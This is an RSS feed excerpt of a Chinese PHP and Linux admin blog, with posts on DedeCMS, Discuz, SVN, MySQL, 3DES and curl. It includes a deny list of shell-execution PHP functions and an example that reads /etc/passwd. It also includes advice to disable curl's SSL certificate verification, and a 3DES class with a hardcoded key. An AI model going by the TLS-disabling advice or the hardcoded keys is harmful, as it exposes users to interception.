$objActSheet-setCellValue(&amp;#8216;C&amp;#8217;.$i, &amp;#8221; &amp;#8220;.$value[&amp;#8220;CARDPWD&amp;#8221;]);    就是这个&amp;#8221; &amp;#8220;，中间有空格哦，带空格的话就能把$value[&amp;#8220;CARDNO&amp;#8221;]由数字型转换为字符型了，在JS中也能用这种技巧  此种方法也对1.00小数点后都为0的情况  </description>
    </item>
    
    <item>
      <title>DedeCMS模板标签系统选项cfg_disable_tags,cfg_disable_funs</title>
      <link>https://ifunbox.top/dedecms_cfg_disable_tags/</link>
      <pubDate>Sat, 17 Aug 2013 08:29:09 +0000</pubDate>
      
      <guid>https://ifunbox.top/dedecms_cfg_disable_tags/</guid>
      <description>cfg_disable_tags，模板引擎禁用标签
用于控制哪些模板标签无法被加载，所有支持的模板标签可见系统目录下的“\include\taglib”，默认php标签是被禁用的。
如果您对网站安全及PHP有一定的了解可以在后台[系统基本设置]中的“其他选项”中进行设置，如果需要禁用多个标签使用英文字符下的“,”进行分割。
如果已经设置了禁用标签，模板中出现相应的标签则会出现提示“DedeCMS Error:Tag disabled:php!”，这就标签你的模板中使用了系统禁用的标签{dede:php}{/dede:php}
cfg_disable_funs，模板标签中禁用函数
主要是针对标签中出现执行php代码，通过禁用危险的函数可以实现模板标签的安全配置，默认禁用的函数 有：phpinfo,eval,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite
如果您还有需要禁用的函数，可以在[系统基本设置]中的“其他选项”进行设置。这样在类似{dede:php}{/dede:php}这样的标签中执行含有以上禁用函数的代码就会出现错误提示。
{dede:php} foreach(array(1,2,3,4,5,6) as $v) { echo $v; } test(); function test() { fopen(); } {/dede:php}  例如这样一段代码，就会出现提示“Error:function disabled &amp;#8220;fopen&amp;#8221;”，意识着这段代码是无法被执行的。
以上两个配置主要考虑到模板标签的安全性，同时希望站长能够查看相关系统服务器安全配置文档来进行综合设定。</description>
    </item>
    
    <item>
      <title>linux下svn服务开机自启动设置方法</title>
      <link>https://ifunbox.top/linux_svn_autostart/</link>
      <pubDate>Thu, 25 Jul 2013 06:11:55 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux_svn_autostart/</guid>
      <description>1 在/etc/rc.d/init.d/下建立svnserved文档
2 copy到svnserved文档下
#!/bin/bash #chkconfig:345 61 61 //此行的345参数表示,在哪些运行级别启动,启动序号(S61);关闭序号(K61)；不加入会出现服务不支持chkconfig的错误 #description:svn //此行必写,描述服务 svnserve -d -r /xxx/xxx/xxx case &amp;quot;$1&amp;quot; in start) echo &amp;quot;starting svnserve...&amp;quot; svnserve -d -r /xxx/xxx/xxx --listen-host xxx.xxx.xxx.xxx echo &amp;quot;finished&amp;quot; ;; stop) echo &amp;quot;stoping svnserve&amp;quot; killall svnserve echo &amp;quot;finished&amp;quot; ;; restart) $0 stop $0 start ;; *) exit esac  3 更改脚本为可执行属性，chmod 557 /etc/rc.d/init.d/svnserved
4 将svnserved脚本设置为系统服务，chkconfig &amp;#8211;add svnserved， 重启系统，ok！</description>
    </item>
    
    <item>
      <title>基于firefox中控件firebug的php调试工具–firephp</title>
      <link>https://ifunbox.top/firefox_firebug_firephp/</link>
      <pubDate>Wed, 24 Jul 2013 08:46:56 +0000</pubDate>
      
      <guid>https://ifunbox.top/firefox_firebug_firephp/</guid>
      <description>FirePHP是什么？
FirePHP是一个利用Firebug console栏输出调试信息方便程序调试。
这一切只需要调用几个简单的函数。
为什么要用它？
在开发环境下正常运行的程序放在生产环境出问题了！
我期望可以在生产环境中进行修改。但不期望客户看到这一切的发生。
请选择FirePHP。
常规的PHPUnit确实能帮助大家进行自动化测试。但我期望更为直观的结果显示。
让我知道程序内发生了什么。看到结果按约输出心里才放心。
请选择FirePHP。
常规var_export()显示在页面上，破坏了页面结构，影响了界面开发人员的工作。
请选择FirePHP。
更多好处等待您的发现。
开始我们的FirePHP之旅：
1、确认您安装了FireFox（对FF有持有偏见，抵制FF的可以走了）。
FireFox：http://www.mozillaonline.com/
2、确认您安装了Firebug。
Firebug：https://addons.mozilla.org/zh-CN/firefox/addon/1843
3、安装FirePHP插件。
FirePHP：https://addons.mozilla.org/zh-CN/firefox/addon/6149
4、安装FirePHP服务器端。
这里有两种安装方式一种通过pear安装，另一种直接下载代码包。
这里建议使用第二种方式。
方式一 通过pear安装：
pear安装方式请参见 Netbeans新增PHPUnit支持 试用手记 http://bbs.phpchina.com/thread-104215-1-1.html
以下为FirePHP安装所需命令。
pear channel-discover pear.firephp.org pear install firephp/FirePHPCore  方式二 直接下载代码包：http://www.firephp.org/DownloadRelease/FirePHPLibrary-FirePHPCore-0.3.2
下载地址： 5、服务端使用方式。
a、引入代码
require_once(&#39;FirePHPCore/fb.php&#39;); // 建议引入此文件即可。文件目录自行安排。使用pear方式安装也是这样引入。  b、开启客户端
开启Firebug 控制台、脚本、网络。
将当前网站添加入FirePHP允许站点（十分容易自己熟悉一下就知道了）。
c、常规使用 效果图如下

d、我一直在用的就是输出一些常量fb($var); 效果图如下

输出一些跟踪信息的
fb::trace();
fb::info(); 
效果图如下

参考资料：http://www.firephp.org/HQ/Use.htm</description>
    </item>
    
    <item>
      <title>解决IE系列浏览器下下载apk变为zip问题</title>
      <link>https://ifunbox.top/ie_download_apk/</link>
      <pubDate>Tue, 23 Jul 2013 09:36:20 +0000</pubDate>
      
      <guid>https://ifunbox.top/ie_download_apk/</guid>
      <description>有时候会在服务器上放一些安卓的app，均以.apk结尾，因一直不用IE，所以也便没有注意到，在IE下会有这样的问题，下载.apk文件时，IE下自动将apk包变为zip压缩包；其他浏览器下木有问题，是因为服务器的mime类型中没有支持apk。修改即可；
简单修改：
1，进入 /usr/local/nginx/conf
2，编辑mime.types文件，在其中加入以下两句，分别是对apk和ipa的支持；
application/vnd.android.package-archive apk; application/iphone pxl ipa; 完事儿重启；
/etc/init.d/nginx restart ok，记录完成。</description>
    </item>
    
    <item>
      <title>PHP快速判断远程图片是否存在函数（不下载图片）</title>
      <link>https://ifunbox.top/php_if_exits_file/</link>
      <pubDate>Mon, 22 Jul 2013 08:59:00 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_if_exits_file/</guid>
      <description>网上找了一些PHP判断远程图片是否存在方法，有的不能用，有的加载了全部图片，导致响应很慢
下面方法亲测可用，赞哦~~
function img_exits($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,$url); curl_setopt($ch, CURLOPT_NOBODY, 1); curl_setopt($ch, CURLOPT_FAILONERROR, 1); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $contents = curl_exec($ch); if($contents!==false) return true; else return false; }  </description>
    </item>
    
    <item>
      <title>MySQL索引类型一览 让MySQL高效运行起来</title>
      <link>https://ifunbox.top/mysql_index_type/</link>
      <pubDate>Mon, 08 Jul 2013 09:31:46 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysql_index_type/</guid>
      <description>索引是快速搜索的关键。MySQL索引的建立对于MySQL的高效运行是很重要的。下面介绍几种常见的MySQL索引类型。
在数据库表中，对字段建立索引可以大大提高查询速度。假如我们创建了一个 mytable表：
CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL ); 我们随机向里面插入了10000条记录，其中有一条：5555, admin。
在查找username=&amp;#8221;admin&amp;#8221;的记录 SELECT * FROM mytable WHERE username=&amp;#8217;admin&amp;#8217;;时，如果在username上已经建立了索引，MySQL无须任何扫描，即准确可找到该记录。相反，MySQL会扫描所有记录，即要查询10000条记录。
索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索包含多个列。
MySQL索引类型包括：
（1）普通索引
这是最基本的索引，它没有任何限制。它有以下几种创建方式：
◆创建索引
CREATE INDEX indexName ON mytable(username(length)); 如果是CHAR，VARCHAR类型，length可以小于字段实际长度；如果是BLOB和TEXT类型，必须指定 length，下同。
◆修改表结构
ALTER mytable ADD INDEX [indexName] ON (username(length)) 
◆创建表的时候直接指定
CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, INDEX indexName ); 删除索引的语法：
DROP INDEX [indexName] ON mytable;
（2）唯一索引
它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。它有以下几种创建方式：</description>
    </item>
    
    <item>
      <title>Discuz管理员前台可以登录后台无法登录</title>
      <link>https://ifunbox.top/discuz_admin_cannot_login/</link>
      <pubDate>Wed, 03 Jul 2013 01:52:36 +0000</pubDate>
      
      <guid>https://ifunbox.top/discuz_admin_cannot_login/</guid>
      <description>    1. 取消ip认证  config_global.php 中找到  $_config[&amp;#8216;admincp&amp;#8217;][&amp;#8216;checkip&amp;#8217;] = 0  2.管理员用户组变为普通用户组了 进入不了后台  直接更改数据库 common_member中 找到管理员对应的记录 将groupid 和adminid 都更改为 1  3. 后台设置了ip列表导致访问不了后台  进入数据库 common_setting 表中搜索 skey 为 adminipaccess ，然后删除svalue中的值  4.有其它用户在同时登录 同一个帐号后台也是进入不了后台的 （只要取消ip认证 就能同时多点登录）  5.密码丢失  如果能够登录uc ，在uc中更改管理员帐号、如果uc和管理员帐号都忘记了。用tools（tools有论坛版 和 uc版 。）工具重置管理员帐  6、设置帐号为创始人，打开/config/config_global.php文件，查找$_config[&amp;#8216;admincp&amp;#8217;][&amp;#8216;founder&amp;#8217;] = ’1′;将帐号id添加进来，多个id用逗号分隔开。(新建管理员账号后台不能登录一般是这个原因)  7、修改\source\class\discuz\discuz_admincp.php中，查找$this-cpaccess = 2;修改为$this-cpaccess = 3;    </description>
    </item>
    
    <item>
      <title>PHP开源Apache日志分析工具收集与比较</title>
      <link>https://ifunbox.top/apache_log_analysis/</link>
      <pubDate>Fri, 28 Jun 2013 02:39:53 +0000</pubDate>
      
      <guid>https://ifunbox.top/apache_log_analysis/</guid>
      <description>我们知道已经有很多像Awtstat这样的使用perl、c或者c++开发的强大的日志分析工具，但是同样也有很多使用PHP开发并且开源的日志分析软件，今天我就收集了一些与大家分享。
1、LogAnalyzer
LogAnalyzer是 Adiscon的监控软件产品线中的一部分。可以再Windows以及Unix环境下运行。LogAnalyzer本是是免费的，GPL许可的产品。
LogAnalyzer的原名为phpLogCon，他在2010年的3月29日发布了3.0的稳定版，并且正式改名为LogAnalyzer。
程序运行必须有他们制定的数据支持，在Windows环境下， 可以使用MonitorWare Agent、WinSysLog、EventReport。在Linux环境下可以使用rsyslog。现在Yum的源中包含了rsyslog这款软件，源中的版本是3.22.1，官方的最高版本是4.6.4的稳定版以及6.1.0的开发版。
由于不能使用原生的数据进行分析，我觉得算是他的一个缺点。
2、Jawstats
这是一款基于Awstat的PHP开源程序，提供了非常漂亮的分析统计结果的展示界面，支持中文。他的作者是 Jon Come。
JAWStats可以减轻AWStats的计算压力，同时安装非常简单，只要稍微修改一下配置文件就可以运行。配置项也可以非常简单。
JAWStats的使用界面也非常人性化，因为作者原来是一个UI工程师。在系统中，我们可以非常容易的在不同月份之间切换，还可以在不同站点的日志之间进行切换。也可以通过Web界面来进行分析数据的更新，正好切合我们的需求，只在需要看的时候出报表就好了。
JAWStats支持主题，可以进行主题的设计和切换。
总的来说，看完了JAWStats的介绍，觉得是比较推荐的一款产品。
3、Web Analytics. Open Source
一款GPL协议下的开源软件，界面和数据获取方式都是模仿GA的，对于小型站点的分析应该不错。有对于Wordpress和Mediawiki的统计支持。
4、Log Miner
LogMiner 是一个分析Apache或者IIS日志，或者其他支持 combined 或者 W3C扩展日志格式的服务器。能够提取并展示包括访问量、点击、流量、请求数、访问路径、浏览器和操作系统在内的诸多指标。数据存储采用的是 PostgreSQL，存储比较精简。
Log Miner开发的灵感源自于流行的 Webalizer ，但是有一些主要的不同：
 使用关系型数据库作为后端数据存储，实时生成报表。而 Webalizer 则是生成 html 文件。基于DBMS数据库的方式能够随时提供不同形式的数据，但是日志文件的解析速度上不如 Webalizer。
Webalizer只保存最近12个月的数据，之前的数据则无法再查看。
Webalizer的报告结果是硬编码的，而Logminer则是每个报告对应一个PHP类，我们可以灵活的进行定义。
LogMiner提供了比Webalizer更多的报表，比如操作系统和访问路径。
 5、Webalizer
Webalizer虽然不是PHP的，但是上面LogMiner总是拿这个作比较，就顺便说一下。用C写成，日志分析能力非常出众，采用HTML的报表展示形式，是一个非常流行的日志分析工具。
6、TraceWatch
一个PHP+Mysql的日志分析工具，界面不太喜欢，好像就是路径分析比较有特点，其他的感觉还有点慢，就没什么了。
其他还有一些不太知名的工具，就没有一一细看：
AudiStat、SlimStat、Piwik
结合看到的这些工具，针对我们单位的实际需求，感觉 Awstat + JAWStats 组合更为好一点。因为日志会收集到单独的日志服务器上，所以性能上的消耗也就不会在意了。接下来看看实际的效果吧。
PS：刚才看AWS的文档，看到一个对比，可能对于特性的了解能够更加的一目了然。</description>
    </item>
    
    <item>
      <title>ShopNC商城前后台注册登陆验证码总是错误解决办法</title>
      <link>https://ifunbox.top/shopnc_captcha_error/</link>
      <pubDate>Thu, 27 Jun 2013 09:14:15 +0000</pubDate>
      
      <guid>https://ifunbox.top/shopnc_captcha_error/</guid>
      <description>验证码若出现问题可尝试以下办法：
1. 是否支持GD库，具体访法：查看phpinfo.php，搜索是否有gd关键词或查看php.ini中 extension=php_gd2.dll一行前面分号是否去掉
2. 清空浏览器所有缓存（包括 cookie），后面的每一步完成后，最后都清除一下缓存
3. 查看cache目录是否有写权限（升级后有时会出现目录权限被更改的情况）
4. 删除 cache/setting.php 文件 ，然后再运行(多发生于升级的情况)
5. 打开数据库表setting，找到name为 subdomain_suffix的行，查看对应的value，
如果为空，则无误，如果不为空，查看是否正确(假设域名为http://www.shopnc.net 此处需要填写&amp;#8221;.shopnc.net&amp;#8221;)，然后删除cache/setting.php文件
6. 使用editplus或zend studio打开 根目录下 config.ini.php，index.php，global.php，查看是开头的&amp;lt;? 是否有空格或其它字符，如有删除，或用原始安装包对应文件替换
7. 如果总提示验证码错误，查看一下客户端与服务器时间是否一致
官方技术人员提的原文链接http://bbs.shopnc.net/forum.php?mod=viewthread&amp;tid=10210</description>
    </item>
    
    <item>
      <title>mysql删除重复记录语句的方法(数据去重)</title>
      <link>https://ifunbox.top/mysql_data_deduplication/</link>
      <pubDate>Mon, 24 Jun 2013 10:01:40 +0000</pubDate>
      
      <guid>https://ifunbox.top/mysql_data_deduplication/</guid>
      <description>最近公司采集来的数据存在重复数据的问题，网上找了一些去重的方法，貌似挺精华的。
记录下以备以后再用。
不过对于数据量比较大的去重，本来想用sphinx，但是sphinx分组貌似只能用一个字段，十分头痛。。。
例如：
id name value
1 a pp
2 a pp
3 b iii
4 b pp
5 b pp
6 c pp
7 c pp
8 c iii
id是主键
要求得到这样的结果
id name value
1 a pp
3 b iii
4 b pp
6 c pp
8 c iii
方法1
delete 表名 where [id] not in ( select max([id]) from 表名 group by (name,value))
方法2
delete a from 表名 a left join(select (id) from 表名 group by name,value) b on a.</description>
    </item>
    
    <item>
      <title>华夏名网ICP备案拍照背景图免费下载</title>
      <link>https://ifunbox.top/sudu_icp_background/</link>
      <pubDate>Thu, 20 Jun 2013 02:10:35 +0000</pubDate>
      
      <guid>https://ifunbox.top/sudu_icp_background/</guid>
      <description>今天收到华夏名网快递的ICP备案拍照幕布背景图
各种麻烦还邮寄
为方便各位站友及时提交备案照片特将背景图拍下来供没有收到图的站友们及时使用
如果PS的不合格为了效率也可以找喷绘打印一张然后再拍照
希望对各位站友有所帮助
下载链接http://url.cn/HvVICI</description>
    </item>
    
    <item>
      <title>php报错Fatal error: Class ‘ZipArchive’ not found解决办法</title>
      <link>https://ifunbox.top/php_ziparchive_not_found/</link>
      <pubDate>Fri, 24 May 2013 13:27:39 +0000</pubDate>
      
      <guid>https://ifunbox.top/php_ziparchive_not_found/</guid>
      <description>最近在使用 PHPPowerPoint类的时候出现Fatal error: Class &amp;#8216;ZipArchive&amp;#8217; not found这个问题，网上搜索了下，解决方法如下
出现这个错误说明是程序在调用&amp;#8217;ZipArchive&amp;#8217; 这个类的时候没有成功，原因是由于在安装php的时候没有增加php zip的支持（非zlib）。
在Windows下的解决办法是：
1、在php.ini文件中，将extension=php_zip.dll前面的分号“;”去除；
(如果没有，请添加extension=php_zip.dll此行并确保php_zip.dll文件存在相应的目录)
然后同样在php.ini文件中，将 zlib.output_compression = Off 改为 zlib.output_compression = On ；
2、重启Apache服务器。
在Unix/Linux下的解决办法：
1、在Linux下没有php_zip.dll这个文件（有也不会起作用的），所以需要重新编译一下php的zip模块。具体安装方法如下：
cd /usr/src
wget http://pecl.php.net/get/zip
tar -zxvf zip
cd zip-1.x.x
phpize
./configure
make
sudo make instal
其中， 在最后使用make install命令的时候，可能需要用到root的权限，所以建议使用sudo来运行。安装完之后，屏幕上会提示zip.so的位置。然后将其记录下来，如：/usr/local/lib/php/extensions/zip.so。
2、使用root权限修改php.ini（通常可能会在/usr/local/lib/文件夹下，不过视当初安装php而定，可以通过phpinfo()来查看）：</description>
    </item>
    
    <item>
      <title>Linux下SVN安装配置以及使用</title>
      <link>https://ifunbox.top/linux_svn_configuration/</link>
      <pubDate>Sat, 18 May 2013 08:07:03 +0000</pubDate>
      
      <guid>https://ifunbox.top/linux_svn_configuration/</guid>
      <description>第一章 安装
1. 采用源文件编译安装。源文件共两个，为：
subversion-1.6.21.tar.gz （subversion 源文件）
subversion-deps-1.6.21.tar.gz （subversion依赖文件）
注意文件版本必须一致,否则很容易产生各种奇怪的问题.
2. 上传以上两个文件到服务器上，解压。解压命令为：
          
 &amp;lt;td&amp;gt; &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;tar&amp;lt;/code&amp;gt; &amp;lt;code&amp;gt;xfvz subversion-1.6.21.&amp;lt;/code&amp;gt;&amp;lt;code&amp;gt;tar&amp;lt;/code&amp;gt;&amp;lt;code&amp;gt;.gz &amp;lt;/code&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;/td&amp;gt; &amp;lt;/tr&amp;gt; &amp;lt;/table&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div&amp;gt; &amp;lt;table&amp;gt; &amp;lt;tr&amp;gt; &amp;lt;td&amp;gt; &amp;lt;/td&amp;gt; &amp;lt;td&amp;gt; &amp;lt;span style=&amp;quot;font-size: medium;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;tar&amp;lt;/code&amp;gt; &amp;lt;code&amp;gt;xfvz subversion-deps-1.6.21.&amp;lt;/code&amp;gt;&amp;lt;code&amp;gt;tar&amp;lt;/code&amp;gt;&amp;lt;code&amp;gt;.gz&amp;lt;/code&amp;gt;&amp;lt;/span&amp;gt; &amp;lt;/td&amp;gt; &amp;lt;/tr&amp;gt; &amp;lt;/table&amp;gt; &amp;lt;/div&amp;gt;   
指令简介：tar 为解压命令，xfvz为tar命令的参数，用于解压tar.gz格式压缩的文件。

3. 解压后生成 subversion-1.6.21 子目录，两个压缩包解压后都会自动放到此目录下，不用手动更改。
4. 进入解压子目录：
       cd subversion-1.</description>
    </item>
    
    <item>
      <title>shopex 解决首页产品图片无法显示，刷新缓存又显示问题</title>
      <link>https://ifunbox.top/548.html</link>
      <pubDate>Sat, 04 May 2013 10:59:11 +0000</pubDate>
      
      <guid>https://ifunbox.top/548.html</guid>
      <description>最近一些客户反应，个别shopex网站首页商品图片会出现不显示的问题（图挂了），清空或者关闭缓存，图片又显示，但是不定时又会不显示的问题。
经过我反复研究终于搞定了，现有偿提供修复，有意联系QQ：614944530.
也可拍下这个宝贝http://item.taobao.com/item.htm?id=20334635319</description>
    </item>
    
    <item>
      <title>PHP实现3DES加密解密，兼容java</title>
      <link>https://ifunbox.top/543.html</link>
      <pubDate>Thu, 02 May 2013 08:11:55 +0000</pubDate>
      
      <guid>https://ifunbox.top/543.html</guid>
      <description>3DES（或称为Triple DES）是三重数据加密算法（TDEA，Triple Data Encryption Algorithm）块密码的通称。它相当于是对每个数据块应用三次DES加密算法。由于计算机运算能力的增强，原版DES密码的密钥长度变得容易被暴力破解；3DES即是设计用来提供一种相对简单的方法，即通过增加DES的密钥长度来避免类似的攻击，而不是设计一种全新的块密码算法。
&amp;lt;?php /** * * PHP版3DES加解密类 * * 可与java的3DES(DESede)加密方式兼容 * * */ class Crypt3Des { public $key = &amp;quot;01234567890123456789012345678912&amp;quot;; public $iv = &amp;quot;23456789&amp;quot;; //like java: private static byte[] myIV = { 50, 51, 52, 53, 54, 55, 56, 57 }; //加密 public function encrypt($input) { $input = $this-&amp;gt;padding( $input ); $key = base64_decode($this-&amp;gt;key); $td = mcrypt_module_open( MCRYPT_3DES, &#39;&#39;, MCRYPT_MODE_CBC, &#39;&#39;); //使用MCRYPT_3DES算法,cbc模式 mcrypt_generic_init($td, $key, $this-&amp;gt;iv); //初始处理 $data = mcrypt_generic($td, $input); //加密 mcrypt_generic_deinit($td); //结束 mcrypt_module_close($td); $data = $this-&amp;gt;removeBR(base64_encode($data)); return $data; } //解密 public function decrypt($encrypted) { $encrypted = base64_decode($encrypted); $key = base64_decode($this-&amp;gt;key); $td = mcrypt_module_open( MCRYPT_3DES,&#39;&#39;,MCRYPT_MODE_CBC,&#39;&#39;); //使用MCRYPT_3DES算法,cbc模式 mcrypt_generic_init($td, $key, $this-&amp;gt;iv); //初始处理 $decrypted = mdecrypt_generic($td, $encrypted); //解密 mcrypt_generic_deinit($td); //结束 mcrypt_module_close($td); $decrypted = $this-&amp;gt;removePadding($decrypted); return $decrypted; } //填充密码，填充至8的倍数 public function padding( $str ) { $len = 8 - strlen( $str ) % 8; for ( $i = 0; $i &amp;amp;lt; $len; $i++ ) { $str .</description>
    </item>
    
    <item>
      <title>利用360安全防护代码加固你的shopex网店，其他网站也可使用</title>
      <link>https://ifunbox.top/537.html</link>
      <pubDate>Sun, 07 Apr 2013 09:09:20 +0000</pubDate>
      
      <guid>https://ifunbox.top/537.html</guid>
      <description>Shopex作为国内用户量最大的独立网店程序，使用的人多，被发现的漏洞也多。安全性一直困扰着shopex电商站长，正可谓“成也shopex，败也shopex”。因为安全，很多站长都放弃了SHOPEX。
360最近发布了一个PHP的通用安全代码，用来帮助站长建立网站安全机制。这个代码非常好用，也方便布署。推荐各位站长好好利用一下。
今天就针对ShopEx网站，做一个说明，如何利用360的防护代码。
下面是攻略（说来非常简单）： 把360_safe3.php文件上传到网店根目录后，在配置文件中加入 require_once(&amp;#8216;360_safe3.php&amp;#8217;); 即可。
为了防止360防护代码被人恶意利用，建议你改一下这个php的文件名称，改成一个不容易被人猜出来的文件名。
另外，这个代码还可以用来防护PHPCMS PHPWIND8.7 DEDE DISCUZX2 WPS METINFO等系统; 具体用法，可以下载这段代码，里面有说明。按照说明来做就可以了。
 360_safe3.php 源文件如下，大家可以参考下  http://www.php100.com/uploadfile/2012/1218/20121218111607291.zip</description>
    </item>
    
    <item>
      <title>phpQuery—基于jQuery的PHP实现</title>
      <link>https://ifunbox.top/531.html</link>
      <pubDate>Fri, 29 Mar 2013 18:26:56 +0000</pubDate>
      
      <guid>https://ifunbox.top/531.html</guid>
      <description> Query的选择器之强大是有目共睹的，phpQuery 让php也拥有了这样的能力，它就相当于服务端的jQuery。
存在的意义 我们有时需要抓取一个网页的内容，但只需要特定部分的信息，通常会用正则来解决，这当然没有问题。正则是一个通用解决方案，但特定情况下，往往有更简单快 捷的方法。比如你想查询一个编程方面的问题，当然可以使用Google，但stackoverflow 作为一个专业的编程问答社区，会提供给你更多，更靠谱的答案。
对于html页面，不应该使用正则的原因主要有3个
1、编写条件表达式比较麻烦
尤其对于新手，看到一堆”不知所云”的字符评凑在一起，有种脑袋都要炸了的感觉。如果要分离的对象没有太明显的特征，正则写起来更是麻烦。
2、效率不高
对于php来说，正则应该是没有办法的办法，能通过字符串函数解决的，就不要劳烦正则了。用正则去处理一个30多k的文件，效率不敢保证。
3、有phpQuery
如果你使用过jQuery，想获取某个特定元素应该是轻而易举的事情，phpQuery让这成为了可能。
&amp;nbsp;
浅析phpQuery phpQuery是基于php5新添加的DOMDocument。而DOMDocument则是专门用来处理html/xml。它提供了强大xpath选 择器及其他很多html/xml操作函数，使得处理html/xml起来非常方便。那为什么不直接使用呢？这个，去看一下官网的函数列表 就知道了，如果对自己的记忆力很有信心， 不妨一试。
简单的例子 &amp;lt;php? include &#39;phpQuery.php&#39;; phpQuery::newDocumentFile(&#39;http://job.blueidea.com&#39;); $companies = pq(&#39;#hotcoms .coms&#39;)-&amp;amp;gt;find(&#39;div&#39;); foreach($companies as $company) { echo pq($company)-&amp;amp;gt;find(&#39;h3 a&#39;)-&amp;amp;gt;text().&amp;quot;&amp;amp;lt;br&amp;amp;gt;&amp;quot;; }  小结  pq()就像jQuery里的$() 基本上jQuery的选择器都可以用在phpQuery上，只要把’.&amp;#8217;变成’-&amp;gt;’ phpQuery提供了好几种载入文件的方法，有的使用字符串，有的使用文件(包括url)，选 择的时候要注意 基本上这一页 就很能说明问题了  </description>
    </item>
    
    <item>
      <title>QQ互联curl发起https请求无返回</title>
      <link>https://ifunbox.top/528.html</link>
      <pubDate>Tue, 26 Mar 2013 06:45:59 +0000</pubDate>
      
      <guid>https://ifunbox.top/528.html</guid>
      <description>给一个客户安装QQ互联是发现请求https无返回
以为是openssl没开，开了也还是如此。
解决方法如下：
设定为不验证证书和host。
在执行curl_exec()之前。设置option
$ch = curl_init();
&amp;#8230;&amp;#8230;
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);</description>
    </item>
    
    <item>
      <title>SAFE MODE Restriction in effect 的问题</title>
      <link>https://ifunbox.top/525.html</link>
      <pubDate>Mon, 18 Mar 2013 09:25:43 +0000</pubDate>
      
      <guid>https://ifunbox.top/525.html</guid>
      <description>当safe_mode设置为 on，PHP 将通过文件函数或其目录检查当前脚本的拥有者是否和将被操作的文件的拥有者相匹配。例如：
-rw-rw-r&amp;#8211; 1 rasmus rasmus 33 Jul 1 19:20 script.php
-rw-r&amp;#8211;r&amp;#8211; 1 root root 1116 May 26 18:01 /etc/passwd 
运行 script.php&amp;lt;?php
readfile(&amp;#8216;/etc/passwd&amp;#8217;);
?&amp;gt; 
如果安全模式被激活，则将会导致以下错误：Warning: SAFE MODE Restriction in effect. The script whose uid is 500 is not
allowed to access /etc/passwd owned by uid 0 in /docroot/script.php on line 2 
haohappy的说法：
原因在于你使用了安全模式，而你上传文件的用户uid和拥有者的uid不同，导致没有访问权限。比如安全模式下，你的ftp上传用户uid为123，而上 传后拥有者的uid为456，就会出现这样的错误。
有两种解决方法：
1。关闭安全模式；
2。在命令行下chown改文件/目录的拥有者
当然两种方法都要求你有服务器的权限。</description>
    </item>
    
    <item>
      <title>Linux SSH常用命令</title>
      <link>https://ifunbox.top/519.html</link>
      <pubDate>Mon, 11 Mar 2013 05:17:06 +0000</pubDate>
      
      <guid>https://ifunbox.top/519.html</guid>
      <description>目录操作：
rm -rf mydir /删除mydir目录/
mkdir dirname /创建名为dirname的目录/
cd mydir /进入mydir目录/
cd &amp;#8211; /回上一级目录/
cd .. /回父目录，中间有空格/
cd ~ /回根目录/
mv tools tool /*把tools目录改名为tool */
ln -s tool bac /给tool目录创建名为bac的符号链接,最熟悉的应该就是FTP中www链接到public_html目录了/
cp -a tool /home/vpser/www /*把tool目录下所有文件复制到www目录下 */
文件操作：
rm go.tar /* 删除go.tar文件 /
find mt.cgi / 查找文件名为mt.cgi的文件 /
df –h / 查看磁盘剩余空间,好像没这个必要，除非你太那个了 */
解压缩：
tar xvf wordpress.tar /* 解压tar格式的文件 /
tar -tvf myfile.tar / 查看tar文件中包含的文件 */
tar cf toole.tar tool /* 把tool目录打包为toole.</description>
    </item>
    
    <item>
      <title>解决.sql大文件无法导入的问题 phpmyadmin上传文件大小限制</title>
      <link>https://ifunbox.top/514.html</link>
      <pubDate>Sat, 09 Mar 2013 03:18:15 +0000</pubDate>
      
      <guid>https://ifunbox.top/514.html</guid>
      <description>用Navicat for MySQL 这个软件中的批处理任务导入.sql文件，经常会出现错误乱码的现象，所以一般用phpmyadmin导入文件和导出文件不会出现乱码的现象
但是使用phpmyadmin导入.sql文件时有一个限制，开始是不能大于2M，所以要对php.ini的参数进行更改，以下是更改方法，更改后需要重新启动；
下面是php.ini的参数设置提高上传大小限制
1、打开php.ini。找到 upload_max_filesize 、 memory_limit 、 post_max_size 这三个参数！
(在默认的情况下,phpmyadmin只允许最大的上传数据为2M,也就是2048KB,而极限的最大使用内存memory_limit也仅为128M，Post的最大也为2M)
2、按您的服务器的实际性能配置进行如下改动：（注意：以下是按我的服务器性能有硬件配置进行的更改..）
upload_max_filesize = 8M (上传最大极限设定为8M,这个应该足够一般的文件WEB上传了)
memory_limit = 512M (因为服务器的内存为2GB,所以这里加到512M不过份吧)
post_max_size = 8M (Post数据最大也设置为8MB,这个跟upload_max一样)
1、修改phpmyadmin config配置文件中的$cfg［‘ExecTimeLimit’］配置选项，默认值是300，需要修改为0，即没有时间限制。
2、修改phpmyadmin安装根目录下的import页面中的$memory_limit
说明：首选读取php.ini配置文件中的内存配置选项memory_limit，如果为空则默认内存大小限制为2M，如果没有限制则内存大小限制为10M，你可以结合你php.ini配置文件中的相关信息修改这段代码。
3、改完之后，重启服务器生效~</description>
    </item>
    
    <item>
      <title>Window2003 iis&#43;mysql&#43;php&#43;zend环境配置&#43;绑定域名</title>
      <link>https://ifunbox.top/510.html</link>
      <pubDate>Wed, 06 Mar 2013 13:39:22 +0000</pubDate>
      
      <guid>https://ifunbox.top/510.html</guid>
      <description>平时穷买不起服务器，一直没有在服务器上小试身手，阿里云服务器可以试用让人很是感动，还有里面的配置着实帮了小白一把。
